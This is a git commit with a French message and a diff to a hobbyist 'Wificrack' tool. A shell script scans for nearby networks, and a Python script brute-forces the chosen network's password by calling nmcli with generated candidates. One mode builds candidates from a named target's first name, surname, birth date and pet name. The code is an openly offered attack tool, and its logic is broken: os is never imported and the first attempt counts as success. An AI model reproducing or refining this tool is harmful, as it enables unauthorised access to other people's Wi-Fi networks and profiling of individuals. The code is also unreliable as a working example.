921936f2a694342f959212e3a479ba72de627a43
BiMathAx <61063210+MathKode@users.noreply.github.com>
2020-08-12 19:39:59 +0200

    CHANGEMENT RADICAL
    j'ai réussit a le faire fonctionné et j'ai modifier le mode de saisit

--- Wificrack/wificrack.py
+++ Wificrack/wificrack.py
@@ -1,15 +1,67 @@
-"""
+
 file = open("info.txt","r")
-nom = file.read()
+nomwifi = file.read()
+file.close()
+file = open("interface.txt","r")
+interface = file.read()
 file.close()
 print("Craqueur PYTHON")
-"""
-find = input('mot de passe : ')
 
-lettre = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
-
+lettre = []
+find = input('Quelle programme veux-tu : CH / Pour choisir tout les caractères que tu veux; DE / Pour utiliser le script default; SE / Pour le script Social Engenering Crack Wifi : ')
+if find.lower() == 'ch' :
+	i = True
+	print('Ecrit les caractères 1 par 1. Ecrit start pour lancer le code') 
+	while i :
+		a = input('CARACTERE : ')
+		if a.lower() == 'start' :
+			i = False
+		else :
+			lettre.append(a)
+elif find.lower() == 'de' :
+	r = input('Veux tu des MAJUSCULES (o/n) : ')
+	lt = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
+	if r.lower() == 'o' :
+		for i in lt :
+			lettre.append(i.upper())
+	r = input('Veux tu des minuscules (o/n) : ')
+	if r.lower() == 'o' :
+		for i in lt :
+			lettre.append(i)
+	r = input('Veux tu des chiffres (o/n) : ')
+	if r.lower() == 'o' :
+		ch = ["0","1","2","3","4","5","6","7","8","9"]
+		for i in ch :
+			lettre.append(i)
+	r = input('Veux tu les symboles les plus utilisés (o/n) : ')
+	if r.lower() == 'o' :
+		sy = ["%","#","é","è","à","@","&","+","=","-","_"]
+		for i in sy :
+			lettre.append(i)
+else :
+	prenom = input("Prénom de la cible (minuscule) : ")
+	nom = input("Nom de la cible (minuscule) : ")
+	JN = input("Jour de naissance  (chiffre): ")
+	MN = input("Mois de naissance (chiffre et/ou minuscule) : ")
+	AN = input("Année de naissance (chiffre) : ")
+	autre = input("Autre (nom de son animal préféré,...) (minuscule) : ")
+	l1 = prenom + nom
+	l2 = JN + MN
+	l3 = AN + autre
+	l4 = l1 + l2
+	final = l3 + l4
+	l5 = list(set(final))
+	l6 = []
+	for i in l5 :
+		try :
+			l = i.upper()
+			l6.append(l)
+		except :
+			print('')
+	l7 = l6 + l5
+	lettre = list(set(l7))
+print(lettre)
 nombre = [-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1]
-
 i = True
 while i :
 	nb = nombre[0]
@@ -29,7 +81,6 @@ while i :
 	position = 0
 	total = len(nombre) - 1
 	final = []
-	
 	while position < total :
 		if int(nombre[position]) != -1 :
 			po = int(nombre[position])
@@ -37,7 +88,9 @@ while i :
 			final.append(str(lf))
 		position = position + 1
 	mot = ''.join(final)
-	print(mot, end="\r")
-	if mot == find :
+	try :
+		os.system('nmcli d wifi connect "' + str(nomwifi) + '" password ' + str(mot) + " ifname " + interface)
 		i = False
+	except :
+		print(mot, end="\r")
 print('le mot de passe est : ' + mot )
--- Wificrack/wificrack.sh
+++ Wificrack/wificrack.sh
@@ -1,17 +1,15 @@
 figlet -f digital wificrack
 echo "by BiMathAx STUDIO"
 echo
-read -p 'Voulez-vous voire le manuel (o/n) : ' commande
-com=${commande^^}
-while [ $com =  'O' ]; do
-	echo "Ce code est craqueur wifi"
-	echo "Il fonctionne en utilisant la fonction bruteforce"
-	echo 
-	echo "ATTENTION, il ne fonctionne pas en VM (car il faut"
-	echo "disposer d'une carte wifi indépendante"
-	break
-done
-sudo nmcli dev wifi
-read -p "SSID : " nom
-"$nom" > info.txt
+echo "Ce code est craqueur wifi"
+echo "Il fonctionne en utilisant la fonction bruteforce"
+echo 
+echo "ATTENTION, il ne fonctionne pas en VM (car il faut"
+echo "disposer d'une carte wifi indépendante"
+ifconfig -s 
+read -p 'Quelle est le nom de l Iface (wlp2s0,...) : ' interface
+echo "$interface" > interface.txt
+iwlist $interface scan | grep ESSID
+read -p "ESSID (sans les guillemets) : " nom
+echo "$nom" > info.txt
 python3 wificrack.py
